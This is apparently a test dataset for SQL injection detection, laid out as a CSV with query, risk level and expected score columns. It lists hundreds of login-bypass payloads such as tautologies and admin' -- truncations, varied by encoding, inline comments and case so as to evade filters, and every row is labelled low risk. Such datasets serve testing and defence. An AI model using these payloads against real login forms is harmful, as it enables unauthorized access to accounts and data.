Query,Risk Level,Expected Score
' OR 'a'='a',low,10
' OR 'a'='a' # comment # HTQNkz,low,10
"""+OR+""a""=""a""",low,10
'+or+'a'='a',low,10
'/**/OR/**/'a'='a',low,10
' OR 'a'='a' -- icRdXBFALx,low,10
' oR 'A'='a',low,10
'%20OR%20'a'='a',low,10
' or 'A'='A',low,10
""" OR ""a""=""a""",low,10
'+OR+'a'='a',low,10
'	OR	'a'='a',low,10
' OR 'a'='a' # XFNDAKLUHe,low,10
' OR 'a'='a' # MySQL comment,low,10
""" OR ""a""=""a"" -- comment",low,10
' or 'A'='A' -- fnqsKbqsQa,low,10
' or 'A'='A' -- NKorPp,low,10
' OR 'a'='a' -- CpWFJ,low,10
' OR 'a'='a' -- lPJMmdq,low,10
'+OR+'a'='a'+/*+test+*/,low,10
' OR 'A'='A' -- KYXLLE,low,10
' OR 'a'='a' -- comment,low,10
' or 'a'='a',low,10
'	OR	'A'='A'	#	MiIXNJv,low,10
' or 'a'='a' # pkvaeq -- ryqbpnifwp,low,10
' OR 'A'='A',low,10
'%20OR%20'a'='a'%20/*%20test%20*/%20#%20bRaNXXM,low,10
""" or ""a""=""a"" -- comment",low,10
'/**/OR/**/'a'='a' # MfBilmHdNk,low,10
""" OR ""A""=""A""",low,10
'%20||%20'a'='a' # AfenQZgehC,low,10
' || 'a'='a',low,10
' or 'A'='A' -- COMment,low,10
' OR 'A'='A' -- comment,low,10
' OR 'a'='a' /* test */,low,10
'	or	'A'='a' # MySQL comment,low,10
'/**/or/**/'A'='A',low,10
'%20||%20'a'='a'%20#%20mmDsuI,low,10
'%20OR%20'a'='a' /* test */,low,10
' OR 'a'='a' -- xmiIFUTHSw,low,10
' or 'a'='a' -- comment,low,10
'/**/||/**/'a'='a',low,10
'/**/OR/**/'a'='a'/**/--/**/SyPYPgNQvX,low,10
'%20OR%20'a'='a' # MySQL comment,low,10
' || 'a'='a' # MySQL comment,low,10
' or 'A'='A' -- QjJtxZeiV,low,10
'+or+'A'='A',low,10
'	OR	'a'='a'	#	MySQL	comment,low,10
' OR 'a'='a' -- FtEZbR # yxXeALb # MySQL comment,low,10
' || 'a'='a' -- KozMKrfYB,low,10
' oR 'a'='A',low,10
' oR 'A'='a' /* TEst */,low,10
'+or+'a'='a' -- vaokdolnn,low,10
' OR 'a'='a' # DLGBTCU # MySQL comment,low,10
'/**/OR/**/'a'='a'/**//*/**/test/**/*/,low,10
' OR 'a'='a' -- QNceiTCB,low,10
'	OR	'a'='a' # MySQL comment,low,10
'/**/OR/**/'a'='a'/**/#/**/GANZhyDZL,low,10
' Or 'a'='A' -- oBdYUeTr,low,10
' Or 'A'='a' /* test */,low,10
"""%20OR%20""a""=""a""",low,10
'%20OR%20'a'='a'%20--%20SKSbtlds,low,10
'%20or%20'A'='A',low,10
'%20OR%20'a'='a' -- UVNvc,low,10
' OR 'a'='a' # yIIWPn,low,10
'	||	'a'='a',low,10
' or 'A'='a' /* test */,low,10
'/**/OR/**/'a'='a' /* test */,low,10
' OR 'a'='a' # xscVKbe,low,10
'/**/OR/**/'a'='a'/**/#/**/RvLAvoun,low,10
'/**/OR/**/'A'='A',low,10
'/**/OR/**/'a'='a'/**/#/**/MySQL/**/comment,low,10
' or 'a'='a' -- rEPiTgjc,low,10
' or 'A'='a' -- GIrgvXFMFR,low,10
' OR 'a'='a' /* test */ -- pnOdO,low,10
' Or 'a'='A',low,10
' OR 'a'='a' -- DmGVtQUguC,low,10
'+OR+'a'='a' # cXvWVgsFr,low,10
'/**/OR/**/'a'='a' -- comment,low,10
' || 'A'='A',low,10
'+OR+'a'='a' /* test */ # QmZRBp,low,10
""" or ""a""=""a""",low,10
' OR 'a'='a' /* test */ # piknT,low,10
'	or	'a'='a',low,10
'	OR	'A'='A',low,10
' || 'a'='a' -- DtFxK,low,10
'%20or%20'A'='A' -- zpSPGeBw,low,10
'	OR	'a'='a' # MySQL comment -- comment,low,10
'%20or%20'a'='a',low,10
' OR 'a'='a' /* test */ # WmwxBPT -- NdxJlLa,low,10
' || 'a'='a' /* test */,low,10
' OR 'a'='a' # AzFcoZ,low,10
""" oR ""a""=""a"" -- OdqAzTmgCc",low,10
'/**/OR/**/'a'='a'/**/--/**/comment,low,10
' OR 'a'='a' /* test */ -- tMoJRg,low,10
' || 'a'='a' # gDfXsgB,low,10
'%20or%20'A'='A'%20--%20CoMMenT,low,10
'%20||%20'a'='a',low,10
' OR 'A'='A' # CxZIfOA,low,10
' OR 'a'='a' # YskPQ,low,10
'%20OR%20'a'='a'/**/#/**/MySQL/**/comment,low,10
' OR 'A'='A' -- XjAqbt,low,10
'+OR+'a'='a'+#+qcILpke,low,10
' OR 'a'='a' -- SrMiiGzzwV,low,10
'+OR+'a'='a'+--+vWwVDeQ,low,10
""" OR ""A""=""A"" # MySQL comment",low,10
'+OR+'A'='A',low,10
"""%20%20OR%20%20""a""=""a"" # LlmArgDDb",low,10
' OR 'a'='a' /* test */ # PfkcFR,low,10
"""+OR+""a""=""a""/**/#/**/MySQL/**/comment",low,10
"""/**/or/**/""a""=""a""",low,10
'/**/OR/**/'a'='a'/**/#/**/OAnIDWrA	--	comment,low,10
' OR 'a'='a' # FNyuDVlrO # klyZl,low,10
'+Or+'a'='A'+--+CoMMEnT,low,10
'	OR	'a'='a' /* test */,low,10
' Or 'a'='a' -- comment # MySQL comment,low,10
' OR 'a'='A',low,10
' OR 'A'='A' # MySQL comment,low,10
"""%20OR%20""a""=""a""/**/--/**/comment",low,10
""" or ""A""=""A""",low,10
'/**/OR/**/'A'='A'/**/--/**/otnWu,low,10
'	or	'a'='a'  --  comment,low,10
' OR 'a'='a' -- FDrVw /* test */,low,10
'/**/OR/**/'a'='a'/**/#/**/comment,low,10
'%20OR%20'a'='a'%20--%20comment,low,10
'%20||%20'A'='A',low,10
' || 'a'='a' # TEwgNBWIDU # UTtJCZ,low,10
'%20OR%20'A'='A',low,10
'/**/OR/**/'a'='a'/**/#/**/gxtnu/**/#/**/MySQL/**/comment,low,10
'%20OR%20'a'='a'%20/*%20test%20*/,low,10
'%20OR%20'a'='a'%20#%20xWBscNHFsl -- comment,low,10
' OR 'a'='a' /* test */ /* test */ -- yVsfclBAvA,low,10
'	||	'a'='a'	#	ofmblvpcT	#	MySQL	comment,low,10
'/**//**/OR/**//**/'a'='a'/**//**/#/**//**/ueLmA/**//**/#/**//**/BdJWGf/**//*/**/test/**/*/,low,10
' or 'a'='A',low,10
' or 'A'='A' -- ZWKUkVT,low,10
'+OR+'A'='A' /* test */,low,10
' OR 'a'='a' /* test */ # MySQL comment # comment,low,10
' or 'a'='a' /* test */ # mysql comment # vakhxkhwz,low,10
' or 'A'='A' -- ppeON /* TEST */ /* TEST */,low,10
'/**/||/**/'A'='A',low,10
' oR 'a'='a' /* test */ -- commENT,low,10
' or 'A'='A' -- COMMENT,low,10
'+OR+'a'='a'/**//*/**/test/**/*/,low,10
'%20OR%20'a'='a'%20/*%20test%20*/%20/*%20test%20*/,low,10
'/**/OR/**/'a'='a'/**/#/**/GSNAtbD,low,10
'	OR	'a'='a' -- comment,low,10
""" || ""A""=""A""",low,10
""" || ""a""=""a""",low,10
' OR 'a'='a' # FiYYK -- lHXdEnL -- comment,low,10
"""%20or%20""a""=""a""",low,10
' or 'A'='A' # yjCAx /* test */ # BUAXQpza,low,10
'	OR	'A'='A'	#	MySQL	comment,low,10
'/**/OR/**/'a'='a' -- uOQDK,low,10
' || 'A'='a' # mYsqL COmmEnT,low,10
'%20%20OR%20%20'a'='a',low,10
'	OR	'a'='a'/**/--/**/comment,low,10
'	OR	'a'='a'	/*	test	*/+--+comment,low,10
""" OR ""a""=""a"" # MySQL comment",low,10
'%20OR%20'A'='A'%20#%20TOTgCz,low,10
'%20or%20'A'='A' -- AEuqIYYCW # mYsql COMMENT,low,10
' OR 'a'='a' # BPJNEQRy,low,10
'/**/OR/**/'a'='a' -- YyoozCog # yogBJz,low,10
'+OR+'a'='a'+#+kaXOjGT,low,10
' OR 'a'='a' # MySQL comment -- comment -- haWARj,low,10
'%20OR%20'a'='a'%20#%20uULzwAtaX%20--%20comment,low,10
'	OR	'A'='A'	#	MYSQL	COMMENT,low,10
'/**/or/**/'a'='a',low,10
'	OR	'a'='a'	#	SXzxRS,low,10
'	OR	'a'='a'+#+RVYPiz,low,10
' OR 'a'='a' # MySQL comment /* test */,low,10
'+OR+'a'='a'+#+comment # QcAFngZuJ,low,10
'	Or	'A'='A',low,10
'+||+'a'='a',low,10
""" or ""A""=""A"" /* test */",low,10
'%20oR%20'a'='a' -- iEWYZvzla,low,10
' oR 'a'='a',low,10
' || 'A'='A' # MBaZA,low,10
' || 'a'='a' -- EANqqjumB,low,10
'%20Or%20'a'='A' /* test */,low,10
'/**/or/**/'A'='A'/**//*/**/TEST/**/*/,low,10
' or 'A'='A' /* test */,low,10
' || 'A'='A' -- BAKXTHYY,low,10
' OR 'a'='a' /* test */ -- comment,low,10
' OR 'A'='A' # QVXUVBNNN,low,10
' || 'A'='A' -- COMMENT -- SXmdcy -- COMMENT,low,10
'	OR	'A'='A' -- zZdaD,low,10
' OR 'a'='a' # comment -- comment -- comment,low,10
' or 'a'='a' # mySQl cOMmEnt,low,10
""" OR ""a""=""a"" # ICxeaIPM",low,10
' OR 'a'='a' # ewQTx,low,10
"""/**/or/**/""A""=""A""",low,10
'/**/OR/**/'a'='a' # kiyyNdvQe,low,10
'+OR+'a'='a' # MySQL comment,low,10
"""	OR	""A""=""A"" /* TEST */",low,10
' OR 'a'='a' # NyaqzvdnpJ # dYMEylOx,low,10
' OR 'a'='a' # svkRRVSSod,low,10
'/**/OR/**/'a'='a'+#+wjrMwwVIb,low,10
' OR 'a'='a' # MySQL comment -- RLOkyzO,low,10
""" OR ""a""=""a"" # MySQL comment # MySQL comment # bMUJMQ",low,10
'+OR+'a'='a'+#+comment,low,10
'+OR+'a'='a'+--+comment,low,10
'	Or	'A'='A' /* tEsT */,low,10
'+or+'A'='a' -- RPTqjo,low,10
'+||+'a'='a' -- VxFsgeq # MTDMvBPHzp,low,10
'+OR+'a'='a' -- iypbg,low,10
""" Or ""A""=""a""",low,10
"""/**/OR/**/""a""=""a""",low,10
' OR 'a'='a' -- comment # vNxUaXHF,low,10
"""/**/OR/**/""A""=""A""/**/#/**/MYSQL/**/COMMENT",low,10
'/**/or/**/'a'='a'/**/#/**/ESneyP/**/#/**/cqLbL,low,10
"""+OR+""a""=""a"" -- comment",low,10
' OR 'A'='A' /* TEST */,low,10
' oR 'a'='a' # ZTqoNY,low,10
'%20or%20'A'='a',low,10
'+OR+'A'='A' -- CqGHB,low,10
' Or 'a'='a' # plRwu,low,10
'%20or%20'a'='a'%20--%20comment,low,10
'+or+'a'='a'+#+mysql+comment+--+alyrxhhgl,low,10
'	or	'A'='A',low,10
""" oR ""A""=""a"" /* tESt */",low,10
""" || ""A""=""a"" -- COMmENt",low,10
""" OR ""A""=""A"" -- comment",low,10
'%20OR%20'A'='A' -- comment,low,10
'+||+'a'='a'%20--%20uCAwkLU,low,10
'+OR+'a'='a' /* test */ -- xpvkviSTv,low,10
"""		OR		""a""=""a""",low,10
' OR 'A'='A' /* test */,low,10
'	OR	'a'='a'	/*	test	*/,low,10
""" OR ""a""=""a"" /* test */",low,10
' OR 'a'='a' /* test */ -- cthetzF /* test */,low,10
' or 'a'='a' -- yddwwcs # avrbcfa,low,10
' or 'a'='A' -- CommeNt # MySQL comment,low,10
'/**//**/OR/**//**/'a'='a',low,10
'+or+'a'='a'+--+comment,low,10
' or 'a'='a' # mysql comment,low,10
' or 'A'='A' # mYsql COMMENT,low,10
'%20OR%20'a'='a'%20--%20bfoTimVb -- qWkMeUgf -- comment,low,10
'	or	'a'='a'	#	mysql	comment/**/#/**/MySQL/**/comment,low,10
'+OR+'a'='a'%20#%20MySQL%20comment # fECnmT,low,10
'+OR+'a'='a' /* test */,low,10
"""	oR	""A""=""a""	#	mYsQL	COMmENT",low,10
'	OR	'a'='a'	#	KOssBmlB # xGQtsft,low,10
'%20or%20'A'='A' -- comment,low,10
' or 'a'='a' /* test */,low,10
'/**/or/**/'A'='A' # MySQL comment,low,10
'/**/OR/**/'A'='A' /* tESt */,low,10
' OR 'a'='a' -- comment -- mlaWiCJCk,low,10
' OR 'A'='A' -- COMMENT,low,10
""" or ""a""=""a"" -- comment # nxscuwiayy",low,10
' OR TRUE --,low,10
' || TRUE --,low,10
'+OR+TRUE+-- -- comment,low,10
'+OR+TRUE+--,low,10
'++OR++TRUE++-- -- bEpFS,low,10
'	OR	TRUE	--,low,10
'	OR	TRUE	-- -- igoccrZ,low,10
""" OR TRUE --",low,10
"""	OR	TRUE	--",low,10
' OR TRUE -- /* test */,low,10
'/**/OR/**/TRUE/**/#,low,10
' Or TrUe -- -- comment,low,10
'%20or%20true%20--,low,10
' OR TRUE -- # fXgPJjun,low,10
' OR TRUE -- -- GBhEGGLfZM,low,10
' OR TRUE -- -- zUiAfnQ,low,10
' OR TRUE -- # MySQL comment,low,10
' or true -- /* test */ # jJxoF,low,10
' OR trUE --,low,10
' OR TRUE -- -- comment,low,10
' or true --,low,10
' or true -- -- xRIIJC,low,10
' OR TRUE -- # vKjNBZG -- GmccH,low,10
' OR TRUE #,low,10
"""%20or%20true%20--",low,10
' OR TRUE -- -- ZAxHNJHxH,low,10
""" OR TRUE -- -- qgDsOoz",low,10
'	OR	TRUE	-- -- BEcyBzkm,low,10
"""/**/OR/**/TRUE/**/--",low,10
""" or true --",low,10
'/**/OR/**/TRUE/**/--/**/--/**/comment,low,10
'/**/or/**/true/**/--,low,10
'/**/OR/**/TRUE/**/-- -- comment,low,10
' OR TRUE # /* test */ # MySQL comment,low,10
'%20OR%20TRUE%20--,low,10
""" OR trUE --",low,10
' OR TRUE -- /* test */ -- comment,low,10
'+or+true+--+--+COMMENT,low,10
' OR TRUE -- -- aTtvkTj,low,10
' OR TRUE # -- RkSMVzEtS,low,10
'/**/OR/**/TRUE/**/--/**//*/**/test/**/*/,low,10
'	||	TRUE	--,low,10
' oR tRuE --,low,10
' OR TRUE -- /* test */ -- qpGhHk,low,10
'	OR	TRUE	-- -- comment,low,10
'+OR+TRUE+#,low,10
' OR TRUE -- # ISULselY # nNKfHN,low,10
' OR TRUE -- /* TEST */,low,10
' OR TRUE # /* test */,low,10
' OR TRUE # /* test */ # comment,low,10
'	OR	TRUE	--	--	comment,low,10
'	oR	tRUE	--,low,10
'/**/OR/**/TRUE/**/-- -- NAgUkJT,low,10
""" or true -- # MySQL comment",low,10
'/**/oR/**/tRUE/**/--,low,10
'/**/OR/**/TRUE/**/--,low,10
'+oR+tRUE+--,low,10
'+oR+tRuE+-- # MySQL comment,low,10
'%20OR%20TRUE%20--%20#%20IdnfsAR,low,10
""" OR TRUE -- /* test */",low,10
' oR TruE -- -- comment,low,10
""" OR TRUE -- -- comment",low,10
' OR TRUE -- -- QHdvs,low,10
' OR TRUE # # comment -- comment,low,10
'+OR+TRUE+-- -- whBoDPuj,low,10
'/**/OR/**/TRUE/**/-- -- KqQek -- comment,low,10
' OR TRUE -- # OHClYUCvNc,low,10
'	OR	TRUE	-- # zkoKLPOObJ,low,10
'+oR+TRUe+--+#+CNtCyCFse,low,10
' Or tRUE --,low,10
' OR TRUE -- # ewtpVIWyfr,low,10
'	OR	TRUE	--	/*	test	*/	/*	test	*/,low,10
' or true -- /* TEST */,low,10
"""/**/OR/**/TRUE/**/#",low,10
'+or+true+--,low,10
'+||+TRUE+--,low,10
""" OR TrUE --",low,10
' or TruE --,low,10
' or true -- # mysql comment,low,10
'	or	true	--,low,10
'+OR+TRUE+-- # wZLSFIe,low,10
' OR TRUE -- -- ggRQfqIOq,low,10
' or true -- /* test */,low,10
' or true -- -- XRsdRlF,low,10
'/**/OR/**/TRUE/**/--/**/#/**/VWXLl,low,10
'/**/||/**/TRUE/**/--,low,10
'+OR+TRUE+--+/*+test+*/,low,10
' || TrUe --,low,10
'+OR+TRUE+-- # wmDuFtzx,low,10
' OR TRUE -- # vWcFe # qKtTwmB,low,10
' OR TRUE -- -- ZDDGYyHa,low,10
' OR TRUE -- # MySQL comment # FHMJW,low,10
' oR tRue --,low,10
' OR TRUE -- # IGwESGvBpX,low,10
' OR TrUE --,low,10
' or true -- # QltThNQ,low,10
'%20oR%20trUE%20#,low,10
"""%20OR%20TRUE%20--",low,10
' or tRuE --,low,10
' OR TRUE -- # RWraHNEA,low,10
' OR TRUE -- # MySQL comment # comUjip -- comment,low,10
' OR TRUE -- # MySQL comment # MySQL comment,low,10
' or true -- # mYsql COMMENT,low,10
' OR TRUE -- -- wIQdZ # MySQL comment,low,10
'+OR+TRUE+--+--+comment,low,10
'+OR+TRUE+-- # MySQL comment,low,10
'%20oR%20tRuE%20--%20/*%20TEST%20*/,low,10
""" OR TRUE -- -- jYVSIxPmX # MySQL comment",low,10
'+OR+TRUE+--+#+MySQL+comment+#+tqconsflR+#+MySQL+comment,low,10
'+||+TRUE+--+--+comment+--+comment+--+comment,low,10
' OR TRUE -- -- COMMENT,low,10
'	||	true	--,low,10
' or true -- # mYsql COMMENT # mYsql COMMENT,low,10
'%20OR%20TRUe%20--,low,10
' Or TRUE -- /* Test */,low,10
'%20OR%20TRUE%20--+#+MySQL+comment+#+eKnGf+--+fFREXT,low,10
'	OR	TRUE	--	--	comment	/*	test	*/	/*	test	*/,low,10
'	||	TRUE	# # MyGrP # ZnwHbUbH,low,10
""" OR TRUE -- -- CqiHZex # MySQL comment",low,10
'/**/or/**/TRue/**/--,low,10
' OR TRUE -- # JljdrON /* test */ /* test */,low,10
'+OR+TRUE+-- /* test */,low,10
'/**/OR/**/TRUE/**/--	--	pXEeMC,low,10
'/**/||/**/TRUE/**/--/**//*/**/test/**/*/ -- comment,low,10
' OR TRUE # # comment,low,10
'	OR	TRUE	-- # MYSQL COMMENT # MySQL comment,low,10
'%20OR%20TRUE%20-- -- comment,low,10
'+or+true+# # MySQL comment,low,10
' or true # -- comment,low,10
""" OR TRUE -- -- comment -- CixNoSH",low,10
'	Or	TRuE	--	#	mYSql	COMMeNT /* TEST */,low,10
""" OR TRUE -- -- qugvRhPzP -- comment",low,10
'/**/or/**/true/**/#,low,10
' OR trUe # # YnXqckNI # ComMeNT -- BOmpjZQG,low,10
'/**/OR/**/TRUE/**/--/**/--/**/comment /* test */ -- ftbAmPR,low,10
'%20OR%20TRUE%20--%20--%20comment -- zHAaae,low,10
'%20%20OR%20%20TRUE%20%20--%20%20#%20%20DpVjzUlKZ,low,10
'%20||%20TRUE%20--%20--%20comment	#	MySQL	comment,low,10
'%20OR%20TRUE%20-- # IgNRq,low,10
"""+OR+TRUE+--",low,10
'	OR	TRUE	--	--	apggzu,low,10
'	or	true	-- /* test */,low,10
' OR TRUE # -- comment,low,10
"""+OR+TRUE+--+--+comment -- quVee",low,10
'%20OR%20TRUE%20--%20--%20qtYCYGnEr,low,10
' OR tRUE -- # bUHps -- FvBEtbleQ,low,10
'/**/OR/**/TRUE/**/-- # MYSQL COMMENT,low,10
'	OR	TRUE	#	#	PKaFLZ,low,10
""" or true -- -- comment",low,10
'+||+TRUE+-- # MySQL comment,low,10
'	OR	TRUE	-- /* test */,low,10
'%20OR%20TRUE%20-- /* test */ -- comment,low,10
'%20OR%20TRuE%20-- # HqGchxaS,low,10
'%20OR%20TRUE%20-- /* test */ /* test */,low,10
' || true --,low,10
'  OR  TRUE  -- # MySQL comment,low,10
' Or TRUe -- -- comment,low,10
'	or	true	--	#	agedgowlt,low,10
'+OR+TRUE+-- -- CKEPEyHnpW,low,10
""" OR TRUE #",low,10
'/**/||/**/true/**/--,low,10
"""%20||%20TRUE%20-- # qCxLTo",low,10
' || TRUE -- /* test */ -- comment,low,10
'/**//**/OR/**//**/TRUE/**//**/-- -- comment,low,10
' || TRUE -- # MySQL comment,low,10
'	OR	TRUE	--	#	MySQL	comment,low,10
""" or true # /* test */",low,10
'/**/or/**/true/**/--/**/--/**/comment,low,10
'/**/or/**/true/**/# # COMMENT,low,10
' || TRUE # /* test */,low,10
'%20oR%20TruE%20#,low,10
'	OR	TRUE	--	--	aOGUj,low,10
'+||+true+--,low,10
' || TRUE #,low,10
'%20||%20TRUE%20--,low,10
'/**/OR/**/trUE/**/#,low,10
'+Or+TrUE+-- /* test */,low,10
"""+OR+TRUE+--+#+JycAQy",low,10
""" or true -- -- COMMENT # VbddxgS",low,10
' OR TRUE -- # QQWqWY -- comment,low,10
'	OR	TRUE	--	/*	test	*/ /* test */,low,10
'/**/Or/**/tRUE/**/-- /* test */,low,10
'		OR		TRUE		--,low,10
'%20||%20true%20-- # ZBaHWarM,low,10
'/**/or/**/true/**/-- # MySQL comment,low,10
'%20OR%20TrUe%20#,low,10
'	OR	TRUE	-- -- NtZoPnG # MySQL comment,low,10
'%20OR%20TRUE%20#+#+comment -- comment,low,10
""" OR TRUE -- /* TEST */",low,10
'%20or%20true%20-- -- comment,low,10
'+or+true+# # AnniTOvg,low,10
'	OR	TRUE	-- # OPOJY,low,10
' OR TRUE -- /* test */ # jkzIJjtw -- comment,low,10
' or true -- /* test */ # MySQL comment,low,10
'/**/OR/**/TRUE/**/--/**/--/**/McyEesIxP,low,10
'	Or	trUE	--	#	aNSwQbqv,low,10
' or true -- -- COMMENT,low,10
' or true -- -- COMMENT -- BhApmUDLd -- XlfOHmjvrL,low,10
'+||+TRUE+--+/*+TEST+*/,low,10
'	oR	true	--,low,10
""" OR TRUE -- -- iXrNhb -- comment -- EUHeouGFIJ",low,10
' OR tRUE #,low,10
'%20OR%20TRUE%20-- # uLzapW /* test */ -- comment,low,10
'++OR++TRUE++--+--+rAFzN,low,10
""" || true --",low,10
' oR True -- -- comment,low,10
'%20or%20true%20--/**/#/**/SusaYX,low,10
' or true #,low,10
'%20OR%20TRUE%20--%20/*%20TEST%20*/,low,10
'%20OR%20TRUE%20#,low,10
' or true -- /* test */ /* test */,low,10
'	OR	TRUE	#,low,10
'	OR	TRUE	-- # GNWXXbOm,low,10
""" || TRUE --",low,10
'	OR	TRUE	--	--	uRZHSb -- cOwFpVrQa,low,10
'%20or%20true%20--%20#%20mysql%20comment # MySQL comment,low,10
'+OR+TRUE+--+--+BOcsazq,low,10
'	or	tRuE	--,low,10
' or true -- -- wsdzgkcg,low,10
' OR TRUE # # MySQL comment,low,10
'+||+truE+--,low,10
'	or	true	--	--	comment,low,10
'/**/OR/**/tRUE/**/--,low,10
'+OR+TRUE+--+#+GYYCZEVHKJ+--+comment,low,10
""" OR TRUE -- /* test */ /* test */",low,10
'	or	tRue	--/**/--/**/waRgPGf,low,10
'%20Or%20TRuE%20--%20/*%20tESt%20*/,low,10
' or tRUe -- /* test */ # CNvmCH,low,10
"""	OR	TRUE	--%20/*%20test%20*/",low,10
'	OR	TRUE	-- -- sfwYiTPs /* test */,low,10
'+||+TRUE+--+#+MyrPfoWcI,low,10
'/**/||/**/TRUE/**/-- # EIASimovik,low,10
"""+or+true+--",low,10
'+OR+tRuE+--,low,10
' OR TRUE # # EmxuQE,low,10
' OR TRUE -- # lbmQI,low,10
' or tRUE -- -- COMMEnT,low,10
'+or+tRuE+--+#+AgGNBHpne,low,10
'+||+TRUe+--,low,10
' or true -- # fcwzz /* test */,low,10
'%20OR%20TRUE%20# # MySQL comment,low,10
'%20OR%20TRUE%20--%20--%20beHATG%20#%20uQOTIrl,low,10
' or true # # rtefexuiyi,low,10
"""  OR  TRUE  -- # WQMSHPPEQ",low,10
'%20OR%20TRUE%20-- /* test */ /* test */ -- JeXste,low,10
' || TRUE -- # maKMCQB /* test */,low,10
"""+OR+TRUE+-- /* test */ /* test */",low,10
"""	OR	TRUE	--	#	MySQL	comment",low,10
"""+OR+TRUE+-- # MySQL comment",low,10
' OR TRUE -- -- comment # blEmeM,low,10
admin' --,low,10
admIn' --,low,10
"admin"" --",low,10
"admin"" -- -- comment",low,10
ADMIN'	--,low,10
admin' -- # RwLqR,low,10
admin'%20--,low,10
"ADMIN"" -- -- GEPJJMTWR",low,10
admin'	--,low,10
aDmin'%20--,low,10
admin'/**/--/**//*/**/test/**/*/,low,10
admin'/**/--,low,10
admin'+#,low,10
admin' -- # HGskFFazUb,low,10
ADMIN'  --,low,10
ADMIN' --,low,10
admin' # # yxtRHN # NBwjoeWlEj,low,10
admin' -- # MySQL comment,low,10
admin' -- -- nDcQAR -- comment,low,10
admin' -- # MhggbHIrJ,low,10
admin'	--	--	dKpQnwPxTr,low,10
admin' -- -- comment # MySQL comment,low,10
ADMIN'/**/-- # CUEPNIU,low,10
"admin"" -- # MySQL comment -- jbYvmyo",low,10
admin'	--	#	BiLKLL,low,10
ADMIN' -- /* TEST */ # ScLIoDeJ,low,10
admin' -- -- comment,low,10
admin' -- -- HcAXUhl,low,10
ADMIN' -- -- oDnGeyfn,low,10
ADMIN' #,low,10
ADMIN' -- # MPcynFcihF,low,10
admin' #,low,10
admin'+--,low,10
Admin' --,low,10
admin'/**/-- # MySQL comment,low,10
"ADMIN"" #",low,10
admin' -- /* test */,low,10
AdmIn'	--,low,10
admin'%20--%20/*%20test%20*/,low,10
admin'	--	#	CvweQbg,low,10
admin'/**/--/**/#/**/CLwEhIm,low,10
"admin""/**/--/**/--/**/LhQxKO",low,10
admin' -- -- bIexH,low,10
admin' -- # XHnSMwL,low,10
ADmIN' --,low,10
adMIn'+--,low,10
admin' -- # jwBVGKfpmm,low,10
adMIN' -- # MYsQL cOMMent -- coMMenT,low,10
admin'	-- -- comment,low,10
ADMIN' -- # MYSQL COMMENT # MYSQL COMMENT,low,10
admin' -- -- mWAMSExo,low,10
admin'%20--%20/*%20test%20*/%20/*%20test%20*/,low,10
Admin'+--,low,10
admin' -- -- lhbMoS,low,10
"admin"" -- # MySQL comment",low,10
admin'  --,low,10
"admin"" -- -- PnrjzHI",low,10
ADMIN'%20--,low,10
admin'/**/-- -- UZTjLJZYw,low,10
ADMIN' -- # ecgdMKqRUy -- TWmvCUs,low,10
ADMIN'	#,low,10
aDmin' -- # MySQL comment # atDWtPOWp,low,10
admin' # /* test */ -- comment,low,10
ADmIn' #,low,10
admin' -- -- GoaDiNY,low,10
admin'+--+#+nmHCCM,low,10
admin'%20--%20/*%20test%20*/%20#%20MySQL%20comment,low,10
aDmIn' -- /* tEst */,low,10
admin'%20-- -- comment # PNcUoNGh,low,10
admin' -- -- comment /* test */,low,10
admin' -- -- lEJzAfUBd,low,10
admin' -- -- qtwArBv,low,10
admin' -- -- HJbIO,low,10
admin'/**/--/**/--/**/zROTeoVI,low,10
admin' -- -- UXElkLwZo,low,10
ADMIN' -- -- BYFSLKVAHN,low,10
aDmIN' --,low,10
admin' -- -- vMMjN,low,10
aDMIN' --,low,10
AdmiN' -- # DQnccJc,low,10
aDMiN' --,low,10
admin' -- -- aiyoYAUFqg,low,10
ADMIN'/**/--,low,10
adMin' --,low,10
admin'/**/#,low,10
admin' # # HLRzxDHpP # AAHmExJgm,low,10
ADMiN' --,low,10
admin' -- # Yfvxu,low,10
admin'	-- # wRjeb,low,10
adMIn' --,low,10
admin' -- -- pselweyemn,low,10
ADMIN'+#,low,10
ADMIN' # /* test */,low,10
aDMiN'/**/-- # MySQL comment,low,10
"ADMIN""  --",low,10
admin'	--	/*	test	*/ -- AyLoBxrM,low,10
admin' -- # IjXsKMNBs,low,10
"admin""+--",low,10
"admin"" # -- comment /* test */",low,10
admin'/**/#/**/#/**/comment,low,10
admin' -- # mYsql COMMENT # rLZUOmmvKU,low,10
admin' -- # dhnUVCJp -- yHAjiO,low,10
"admin""%20-- -- comment",low,10
admin' -- # MySQL comment # MySQL comment # UuocTls,low,10
admin' -- -- iTkHQ,low,10
"ADMIN"" --",low,10
admin'/**/--/**/#/**/DZFpTyXEd,low,10
